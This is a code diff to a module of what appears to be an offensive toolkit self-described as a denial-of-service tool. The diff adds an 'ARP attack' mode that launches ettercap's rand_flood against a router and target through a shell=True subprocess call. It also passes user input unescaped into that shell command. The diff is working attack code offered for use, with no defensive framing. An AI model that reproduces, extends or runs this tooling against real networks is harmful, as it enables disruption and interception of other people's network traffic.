@@ -13,6 +13,7 @@ try:
     import time
     import socket
     import requests
+    import subprocess
     from core import gethost
     from core import printer
     from core import asciigraphs
@@ -60,7 +61,7 @@ class ArchariosFrameworkModule:
                 # Module brief description
                 "bdesc": "A simple Denial-of-Service Tool.",
                 # Module version
-                "version": 1.1,
+                "version": 1.2,
                 # Module author
                 "author": "Catayao56",
                 # Module status
@@ -88,7 +89,8 @@ It is very customizeable so it can suit your needs.
         # Update history
         self.version_history = {
                     1.0: "Initial update",
-                    1.1: "Default attack added."
+                    1.1: "Default attack added.",
+                    1.2: "ARP attack added."
                     }
 
         self._parse_module_info()
@@ -382,29 +384,41 @@ It is very customizeable so it can suit your needs.
                         printer.Printer().print_with_status("xterm not installed!", 2)
                         return 7
 
-                    router_ip = input("Router's IP Address: ")
+                    interface = input("Enter interface name for {0} \
+(e.g. eth0): ".format(values['target']))
+                    router_ip = input("Enter router's IP Address: ")
+
                     try:
-                        conn = self.get_socket_obj(values['protocol'])
-                        conn.connect((router_ip, values['port']))
-                        conn.sendall(random._urandom(1))
-                        recieved_data = conn.recv(1024)
+                        arpflood_command = "xterm -e ettercap -i {0} -Tq -P rand_flood /{1}// /{2}//".format(
+                                interface,
+                                router_ip,
+                                values['target'])
+                        subprocess.Popen(arpflood_command,
+                                stderr=subprocess.PIPE,
+                                stdout=subprocess.PIPE,
+                                shell=True)
+                        printer.Printer().print_with_status("Press enter or CTRL+C \
+to stop attack.", 0)
+                        misc.ProgramFunctions().pause()
+                        raise KeyboardInterrupt
 
                     except Exception as err:
                         printer.Printer().print_with_status(str(err), 2)
                         return 8
 
-                    else:
-                        if len(recieved_data) == 0:
-                            printer.Printer(
-                                    ).print_with_status("Cannot connect to router!", 2)
-                            return 9
-
-                        else:
-                            pass
-
                 except(KeyboardInterrupt, EOFError):
                     printer.Printer().print_with_status("Attack stopped.", 1)
-                    return 0
+                    result = subprocess.getstatusoutput('killall ettercap')
+                    if result[0] == 0:
+                        return 0
+
+                    else:
+                        printer.Printer().print_with_status("Cannot kill ettercap! \
+Please manually kill ettercap by typing `killall ettercap` in your terminal.", 1)
+                        return 0
+
+            # elif values['attack_mode'].lower() == 'dhcp':
+            #     try:
 
             else:
                 printer.Printer().print_with_status("Invalid attack_mode!", 2)
